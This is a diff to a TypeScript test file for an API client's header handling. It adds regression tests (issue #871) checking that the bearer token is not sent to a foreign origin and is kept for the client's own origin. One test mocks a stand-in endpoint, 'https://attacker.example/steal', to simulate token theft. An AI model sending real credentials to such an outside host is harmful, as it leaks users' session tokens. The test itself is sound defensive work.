@@ -116,6 +116,36 @@ describe('ApiClient: заголовки', () => {
     expect(authorization).toBe('Bearer session-token-abc');
   });
 
+  // Абсолютный адрес чужого origin — без токена (#871): иначе его увёл бы
+  // любой, кто сумел подсунуть клиенту свою ссылку.
+  it('does not send the token to another origin', async () => {
+    let authorization: string | null = 'не тронуто';
+    server.use(
+      http.get('https://attacker.example/steal', ({ request }) => {
+        authorization = request.headers.get('Authorization');
+        return HttpResponse.json({ ok: true });
+      })
+    );
+
+    await createClient('session-token-abc').get('https://attacker.example/steal');
+
+    expect(authorization).toBeNull();
+  });
+
+  it('keeps the token for an absolute address of its own origin', async () => {
+    let authorization: string | null = null;
+    server.use(
+      http.get(api('/users/me'), ({ request }) => {
+        authorization = request.headers.get('Authorization');
+        return HttpResponse.json({ id: 'user-1' });
+      })
+    );
+
+    await createClient('session-token-abc').get(api('/users/me'));
+
+    expect(authorization).toBe('Bearer session-token-abc');
+  });
+
   it('should omit authorization without a token', async () => {
     let authorization: string | null = 'не тронуто';
     server.use(
